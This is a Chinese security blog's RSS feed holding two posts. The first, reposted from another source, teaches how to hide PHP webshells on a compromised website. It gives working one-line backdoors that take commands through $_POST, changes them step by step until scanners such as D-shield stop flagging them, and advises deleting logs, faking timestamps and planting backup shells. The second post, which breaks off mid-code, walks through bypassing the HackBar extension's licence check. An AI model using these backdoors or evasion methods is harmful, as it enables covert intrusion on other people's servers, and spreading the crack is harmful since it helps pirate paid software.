<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title>ctf - 标签 - zu1k</title><link>https://lgf.im/tags/ctf/</link><description>ctf - 标签 - zu1k</description><generator>Hugo -- gohugo.io</generator><language>zh-CN</language><managingEditor>i@lgf.im (zu1k)</managingEditor><webMaster>i@lgf.im (zu1k)</webMaster><copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright><lastBuildDate>Sat, 08 Aug 2020 09:21:59 +0000</lastBuildDate><atom:link href="https://lgf.im/tags/ctf/" rel="self" type="application/rss+xml"/><item><title>如何优雅的隐藏你的Webshell</title><link>https://lgf.im/posts/security/web-security/hide-your-webshell/</link><pubDate>Sat, 08 Aug 2020 09:21:59 +0000</pubDate><author>作者</author><guid>https://lgf.im/posts/security/web-security/hide-your-webshell/</guid><description><![CDATA[<blockquote>
<p>转自：酒仙桥六号部队 <a href="https://mp.weixin.qq.com/s/lExi2_y4NkTak735kpz4ug">https://mp.weixin.qq.com/s/lExi2_y4NkTak735kpz4ug</a>
这个公众号的文章质量都非常高，推荐大家关注</p>
</blockquote>
<p>拿下一个站后总希望自己的后门能够很隐蔽！不让网站管理员或者其他的Hacker发现，网上关于隐藏后门的方法也很多，如加密、包含，解析漏洞、加隐藏系统属性等等，但大部分已经都不实用了，随便找一个查马的程序就能很快的查出来，下面分享我总结的一些经验：</p>
<h2 id="制作免杀webshell">制作免杀webshell</h2>
<p>隐藏webshell最主要的就是做免杀，免杀做好了，你可以把webshell放在函数库文件中或者在图片马中，太多地方可以放了，只要查杀工具查不到，你的这个webshell就能存活很长时间，毕竟管理员也没有那么多精力挨个代码去查看。</p>
<h3 id="命令执行的方法">命令执行的方法</h3>
<p>这里使用我们最常用的php的一句话马来给大家做演示，PHP版本是5.6的，在写一句话马之前我们来先分析一下PHP执行命令方法</p>
<h4 id="直接执行">直接执行</h4>
<p>使用php函数直接运行命令,常见的函数有(eval、system、assert)等，可以直接调用命令执行。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="s1">&#39;echo 这是输出;&#39;</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><p></p>
<h4 id="动态函数执行">动态函数执行</h4>
<p>我们先把一个函数名当成一个字符串传递给一个变量，在使用变量当作函数去执行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php"><span class="nv">$a</span><span class="o">=</span><span class="s2">&#34;phpinfo&#34;</span><span class="p">;</span><span class="nv">$a</span><span class="p">();</span>
</code></pre></td></tr></table>
</div>
</div><p></p>
<h4 id="文件包含执行">文件包含执行</h4>
<p>有两个php文件，我们把执行命令的放在文件b中，使用文件a去包含，达到执行的效果</p>
<p>b.php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="s1">&#39;echo 这是输出;&#39;</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><p>a.php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">include</span> <span class="nx">a</span><span class="o">.</span><span class="nx">php</span>
</code></pre></td></tr></table>
</div>
</div><p></p>
<h3 id="回调函数">回调函数</h3>
<p>将想要执行命令的函数赋值给一个变量，再用一个可以调用函数执行的函数把变量解析成函数，这么说可能有点绕，看一下array_map函数的用法：array_map函数中将$arr每个元素传给func函数去执行，例子：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nv">$func</span> <span class="o">=</span> <span class="s1">&#39;system&#39;</span><span class="p">;</span>
<span class="nv">$arr</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">);</span>
<span class="nx">array_map</span><span class="p">(</span><span class="nv">$func</span><span class="p">,</span> <span class="nv">$arr</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><p></p>
<h3 id="php-curly-syntax">PHP Curly Syntax</h3>
<p>我们可以理解为字符串中掺杂了变量，再使用变量去拼接字符串，达到命令执行的效果</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nv">$a</span> <span class="o">=</span> <span class="s1">&#39;p&#39;</span><span class="p">;</span>
<span class="k">eval</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">{</span><span class="nv">$a</span><span class="si">}</span><span class="s2">hpinfo();&#34;</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><p></p>
<h3 id="php反序列化">php反序列化</h3>
<p>这是根据php反序列化漏洞来实现命令执行，可以先创建一个反序列化的漏洞文件，再去调用反序列化函数unserialize</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">class</span> <span class="nc">test</span><span class="p">{</span>
    <span class="k">public</span> <span class="nv">$a</span><span class="o">=</span><span class="s2">&#34;123&#34;</span><span class="p">;</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
        <span class="k">eval</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="nx">unserialize</span><span class="p">(</span><span class="s1">&#39;O:4:&#34;test&#34;:1:{s:1:&#34;a&#34;;s:10:&#34;phpinfo();&#34;;}&#39;</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><p></p>
<h3 id="phpinput方法">php://input方法</h3>
<p>php://input可以访问请求的原始数据的只读流，我们可以理解为我们传post参数，php://input会读取到，这时候我们就可以加以利用了。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="s1">&#39;php://input&#39;</span><span class="p">));</span>
</code></pre></td></tr></table>
</div>
</div><p></p>
<h3 id="preg_replace方法">preg_replace方法</h3>
<p>preg_replace函数执行一个正则表达式的搜索和替换。我们可以使用一个命令执行函数去替换正常的字符串，然后去执行命令。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">echo</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s2">&#34;/test/e&#34;</span><span class="p">,</span><span class="nx">phpinfo</span><span class="p">(),</span><span class="s2">&#34;jutst test&#34;</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><p></p>
<h3 id="ob_start">ob_start</h3>
<p>ob_start函数是打开输出控制缓冲，传入的参数会在使用ob_end_flush函数的时候去调用它执行输出在缓冲区的东西。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nv">$cmd</span> <span class="o">=</span> <span class="s1">&#39;system&#39;</span><span class="p">;</span>
<span class="nx">ob_start</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span>
<span class="k">echo</span> <span class="s2">&#34;whoami&#34;</span><span class="p">;</span>
<span class="nx">ob_end_flush</span><span class="p">();</span><span class="c1">//输出全部内容到浏览器
</span></code></pre></td></tr></table>
</div>
</div><p></p>
<h2 id="编写免杀">编写免杀</h2>
<p>上面说了那么多其实都是一句话木马的思路，每一种方式都可以写成一句话木马，而想要免杀常常会多种组合到一起，下面从最简单的木马一步步变形，达到免杀的目的。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">assert</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;x&#39;</span><span class="p">]);</span>
</code></pre></td></tr></table>
</div>
</div><p></p>
<p>这种就是最简单的一句话木马，使用D盾扫一下，可以看到5级，没有什么好说的。</p>
<p>动态函数方法,把assert这个函数赋值两次变量,再把变量当成函数执行。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php"><span class="nv">$c</span> <span class="o">=</span> <span class="s2">&#34;assert&#34;</span><span class="p">;</span>
<span class="nv">$c</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;x&#39;</span><span class="p">]);</span>
</code></pre></td></tr></table>
</div>
</div><p></p>
<p>回调函数方法，把assert函数当作参数传给array_map去调用执行。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nv">$fun</span> <span class="o">=</span> <span class="s1">&#39;assert&#39;</span><span class="p">;</span>
<span class="nx">array_map</span><span class="p">(</span><span class="nv">$fun</span><span class="p">,</span><span class="k">array</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;x&#39;</span><span class="p">]));</span>
</code></pre></td></tr></table>
</div>
</div><p></p>
<p>可以看到上面的都是通过两种方法的结合，简单的处理一下，就变成了4级，感兴趣的可以把其他的方法都尝试一下，4级的很简单，我们去看看3级的都是怎么处理的</p>
<p>通过上面的动态函数方法我们可以思考，函数可以当成字符串赋值给变量，那么变量也一定能当成字符串赋值给变量，但调用时需要用$$</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nv">$a</span> <span class="o">=</span> <span class="s2">&#34;assert&#34;</span><span class="p">;</span>
<span class="nv">$c</span> <span class="o">=</span><span class="s1">&#39;a&#39;</span><span class="p">;</span>
<span class="nv">$$c</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;x&#39;</span><span class="p">]);</span>
</code></pre></td></tr></table>
</div>
</div><p></p>
<p>我们在把这种方法结合到回调函数方法中，可以看到，已经是2级了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nv">$fun</span> <span class="o">=</span> <span class="s1">&#39;assert&#39;</span><span class="p">;</span>
<span class="nv">$f</span> <span class="o">=</span> <span class="s1">&#39;fun&#39;</span><span class="p">;</span>
<span class="nx">array_map</span><span class="p">(</span><span class="nv">$$f</span><span class="p">,</span><span class="k">array</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;x&#39;</span><span class="p">]));</span>
</code></pre></td></tr></table>
</div>
</div><p></p>
<p>这时候我们看一下D盾中的说明：array_map中的参数可疑，我们这时候可以用函数封装一下参数</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">function</span> <span class="nf">ass</span><span class="p">(){</span>
    <span class="nv">$a</span> <span class="o">=</span> <span class="s2">&#34;a451.ass.aaa.ert.adaww&#34;</span><span class="p">;</span>
    <span class="nv">$b</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">,</span><span class="nv">$a</span><span class="p">);</span>
    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$b</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">.</span> <span class="nv">$b</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
    <span class="k">return</span> <span class="nv">$c</span><span class="p">;</span>
<span class="p">}</span>
<span class="nv">$b</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;x&#39;</span><span class="p">]);</span>
<span class="nv">$c</span> <span class="o">=</span> <span class="nx">ass</span><span class="p">();</span>
<span class="nx">array_map</span><span class="p">(</span><span class="nv">$c</span><span class="p">,</span><span class="nv">$b</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><p></p>
<p>1级了，离目标近在咫尺了，这时候我们应该考虑让一句话木马像正常的代码，在好好的封装一下</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nx">functiondownloadFile</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span><span class="nv">$x</span><span class="p">){</span>
    <span class="nv">$ary</span> <span class="o">=</span> <span class="nx">parse_url</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
    <span class="nv">$file</span> <span class="o">=</span> <span class="nx">basename</span><span class="p">(</span><span class="nv">$ary</span><span class="p">[</span><span class="s1">&#39;path&#39;</span><span class="p">]);</span>
    <span class="nv">$ext</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">,</span><span class="nv">$file</span><span class="p">);</span>
    <span class="c1">// assert 
</span><span class="c1"></span>    <span class="nv">$exec1</span><span class="o">=</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$ext</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="mi">3</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
    <span class="nv">$exec2</span><span class="o">=</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$ext</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="mi">5</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
    <span class="nv">$exec3</span><span class="o">=</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$ext</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="mi">5</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
    <span class="nv">$exec4</span><span class="o">=</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$ext</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="mi">4</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
    <span class="nv">$exec5</span><span class="o">=</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$ext</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="mi">7</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span>
    <span class="nv">$as</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$exec1</span> <span class="o">.</span> <span class="nv">$exec2</span> <span class="o">.</span> <span class="nv">$exec3</span> <span class="o">.</span> <span class="nv">$exec4</span> <span class="o">.</span> <span class="nv">$exec5</span><span class="p">;</span>
    <span class="nv">$as</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$x</span><span class="p">;</span>
    <span class="k">return</span> <span class="nv">$as</span><span class="p">;</span>
<span class="p">}</span>

<span class="nv">$a</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;x&#39;</span><span class="p">];</span>
<span class="nv">$s</span> <span class="o">=</span> <span class="nx">downloadFile</span><span class="p">(</span><span class="s1">&#39;http://www.baidu.com/asdaesfrtafga.txt&#39;</span><span class="p">,</span><span class="nv">$a</span><span class="p">);</span>
<span class="nv">$b</span> <span class="o">=</span> <span class="nv">$s</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="nv">$c</span> <span class="o">=</span> <span class="nv">$s</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
<span class="nx">array_map</span><span class="p">(</span><span class="nv">$b</span><span class="p">,</span><span class="k">array</span><span class="p">(</span><span class="nv">$c</span><span class="p">));</span>
</code></pre></td></tr></table>
</div>
</div><p></p>
<p>再试试其他免杀工具。</p>
<p>WebShellKiller：</p>
<p></p>
<p>安全狗：</p>
<p></p>
<p>微步云沙箱：</p>
<p></p>
<p>再试试可不可以连接没有问题，完美！！</p>
<p></p>
<h2 id="更好的隐藏webshell一些建议">更好的隐藏webshell一些建议</h2>
<ol>
<li>
<p>拿到权限以后,把网站日志中的所有关于webshell的访问记录和渗透时造成的一些网站报错记录全部删除</p>
</li>
<li>
<p>把webshell的属性时间改为和同目录文件相同的时间戳,比如linux中的touch就是非常好的工具</p>
</li>
<li>
<p>目录层级越深越好,平时网站不出问题的话,一般四五级目录很少会被注意到,尽量藏在那些程序员和管理员都不会经常光顾的目录中比如:第三方工具的一些插件目录,主题目录,编辑器的图片目录以及一些临时目录</p>
</li>
<li>
<p>利用php.ini 配置文件隐藏webshell,把webshell的路径加入到配置文件中</p>
</li>
<li>
<p>尝试利用静态文件隐藏一句话,然后用.htaccess 规则进行解析</p>
</li>
<li>
<p>上传个精心构造的图片马,然后再到另一个不起眼的正常的网站脚本文件中去包含这个图片马</p>
</li>
<li>
<p>靠谱的方法就是直接把一句话插到正常的网站脚本文件里面,当然最好是在一个不起眼的地方,比如:函数库文件,配置文件里面等等,以及那些不需要经常改动的文件</p>
</li>
<li>
<p>如果有可能的话,还是审计下目标的代码,然后想办法在正常的代码中构造执行我们自己的webshell,即在原生代码中执行webshell</p>
</li>
<li>
<p>webshell里面尽量不要用类似eval这种过于敏感的特征,因为awk一句话就能查出来,除了eval,还有,比如:exec,system,passthru,shell_exec,assert这些函数都最好不要用,你可以尝试写个自定义函数,不仅能在一定程度上延长webshell的存活时间也加大了管理员的查找难度,也可以躲避一些功能比较简陋waf查杀,此外,我们也可以使用一些类似:call_user_func,call_user_func_array,诸如此类的回调函数特性来构造我们的webshell,即伪造正常的函数调用</p>
</li>
<li>
<p>webshell的名字千万不要太扎眼,比如:hack.php,sb.php,x.php这样的名字严禁出现……,在给webshell起名的时候尽量跟当前目录的,其他文件的名字相似度高一点,这样相对容易混淆视听,比如:目录中有个叫new.php的文件,那你就起个news.php</p>
</li>
<li>
<p>如果是大马的话,尽量把里面的一些注释和作者信息全部都去掉,比如intitle字段中的版本信息等等,用任何大马之前最好先好好的读几遍代码,把里面的shell箱子地址全部去掉推荐用开源的大马,然后自己拿过来仔细修改,记住,我们的webshell尽量不要用加密,因为加密并不能很好的解决waf问题,还有,大马中一般都会有个pass或者password字符,建议把这些敏感字段全部换成别的,因为利用这样的字符基本一句话就能定位到</p>
</li>
<li>
<p>养成一个好习惯,为了防止权限很快丢失,最好再同时上传几个备用webshell,注意,每个webshell的路径和名字千万不要都一样更不要在同一个目录下,多跳几层,记住,确定shell正常访问就可以了,不用再去尝试访问看看解析是否正常,因为这样就会在日志中留下记录,容易被查到</p>
</li>
<li>
<p>当然,如果在拿到服务器权限以后,也可以自己写个脚本每隔一段时间检测下自己的webshell是否还存在,不存在就创建</p>
</li>
<li>
<p>在有权限的情况,看看管理员是否写的有动态webshell监测脚本,务必把脚本找出来,crontab一般都能看见了</p>
</li>
</ol>
]]></description></item><item><title>HackBar破解</title><link>https://lgf.im/posts/security/web-security/hack-hackbar/</link><pubDate>Sun, 22 Mar 2020 10:11:42 +0000</pubDate><author>作者</author><guid>https://lgf.im/posts/security/web-security/hack-hackbar/</guid><description><![CDATA[<h2 id="前言">前言</h2>
<p>相信很多研究安全或者打CTF的朋友都在使用HackBar，在浏览器中使用HackBar构造并发送请求非常方便，特别是测试sql注入和xss等常见漏洞。</p>
<p>但是HackBar是收费软件，在其 <a href="https://hackbar.site/" target="_blank" rel="noopener noreffer">官网</a> 上，价格由3刀到89刀不等。很多安全研究人员会选择购买89刀的10年证书，但是对于学生来说，短期的一个月1刀的短期价格对于这样一个浏览器插件来说还是比较贵的。</p>
<p></p>
<p>考虑到浏览器扩展插件的逻辑代码都是js代码，并且大部分工具类插件的代码都存放在本地，所以破解这类软件变得非常简单。</p>
<p>未破解前的hackbar是这样的，按钮没法用，显示一个红框</p>
<p></p>
<p>下面我将以Chrome浏览器为例，对HackBar插件进行破解。</p>
<h2 id="破解插件">破解插件</h2>
<h3 id="找到插件路径">找到插件路径</h3>
<p>首先我们需要在官网上找到插件的安装地址并进行安装</p>
<p></p>
<p>安装后插件会存放在我们电脑的本地</p>
<p>在chrome中打开 <a href="chrome://version/" target="_blank" rel="noopener noreffer">version</a> 页面，可以在 <code>个人资料路径</code> 位置找到Chrome浏览器数据的存放位置</p>
<p></p>
<p>我们在文件管理器中打开这个路径，找到里面的<code>Extension</code>目录，这个目录里面就存放了我们的所有扩展插件</p>
<p></p>
<p>我们可以在扩展程序界面看到所有插件的ID，找到HackBar的ID，然后从Extension目录中找到这个目录，进入后就是HackBar的插件目录</p>
<h3 id="分析授权验证">分析授权验证</h3>
<p>我们先将插件这个目录复制出来，然后用编辑器打开，其中授权验证相关代码在 <code>theme\js\hackbar-panel.js</code> 这个js文件中</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="c1">// 授权验证失败
</span><span class="c1"></span><span class="kd">function</span> <span class="nx">disable_hackbar</span><span class="p">(</span><span class="nx">message</span><span class="o">=</span><span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">// 将hidden属性移除，就会显示输入证书的红框
</span><span class="c1"></span>    <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#alert-license&#39;</span><span class="p">).</span><span class="nx">removeClass</span><span class="p">(</span><span class="s1">&#39;hidden&#39;</span><span class="p">);</span>
    <span class="c1">// 如果有消息，就在证书那个红框显示出来
</span><span class="c1"></span>    <span class="k">if</span><span class="p">(</span><span class="nx">message</span><span class="p">){</span>
        <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#alert-license span&#39;</span><span class="p">).</span><span class="nx">text</span><span class="p">(</span><span class="nx">message</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="c1">// 标记证书无效
</span><span class="c1"></span>    <span class="nx">license_ok</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// 从chrome本地存储中获取都license内容
</span><span class="c1"></span><span class="nx">chrome</span><span class="p">.</span><span class="nx">storage</span><span class="p">.</span><span class="nx">local</span><span class="p">.</span><span class="nx">get</span><span class="p">([</span><span class="s1">&#39;license&#39;</span><span class="p">],</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">result</span><span class="p">)</span> <span class="p">{</span>
    <span class="kr">const</span> <span class="nx">license</span> <span class="o">=</span> <span class="nx">result</span><span class="p">.</span><span class="nx">license</span><span class="p">;</span>
    <span class="c1">// 如果证书内容存在
</span><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nx">license</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">//通过链接谷歌服务器检查网络情况
</span><span class="c1"></span>        <span class="nx">fetch</span><span class="p">(</span><span class="s2">&#34;https://google.com&#34;</span><span class="p">)</span>
            <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">response</span><span class="p">)</span> <span class="p">{</span>
                <span class="c1">// 从证书服务器检查证书
</span><span class="c1"></span>                <span class="nx">fetch</span><span class="p">(</span><span class="nx">license_server</span> <span class="o">+</span> <span class="s2">&#34;/&#34;</span> <span class="o">+</span> <span class="nx">license</span><span class="p">)</span>
                    <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">response</span><span class="p">)</span> <span class="p">{</span>
                        <span class="k">return</span> <span class="nx">response</span><span class="p">.</span><span class="nx">json</span><span class="p">();</span>
                    <span class="p">})</span>
                    <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
                        <span class="c1">// 无效的证书会返回
</span><span class="c1"></span>                        <span class="c1">// {&#34;pong&#34;:false,&#34;message&#34;:&#34;License is invalid&#34;}
</span><span class="c1"></span>                        <span class="kr">const</span> <span class="nx">pong</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">pong</span><span class="p">;</span>
                        <span class="k">if</span> <span class="p">(</span><span class="nx">pong</span> <span class="o">===</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span>
                            <span class="c1">// 证书无效，调用函数显示红框并使功能不可用
</span><span class="c1"></span>                            <span class="nx">disable_hackbar</span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">message</span><span class="p">);</span>
                        <span class="p">}</span>
                    <span class="p">}).</span><span class="k">catch</span><span class="p">(</span><span class="nx">error</span> <span class="p">=&gt;</span> <span class="p">{</span>
                        <span class="c1">// 授权服务器连接不上
</span><span class="c1"></span>                        <span class="nx">disable_hackbar</span><span class="p">();</span>
                    <span class="p">});</span>
            <span class="p">})</span>
            <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
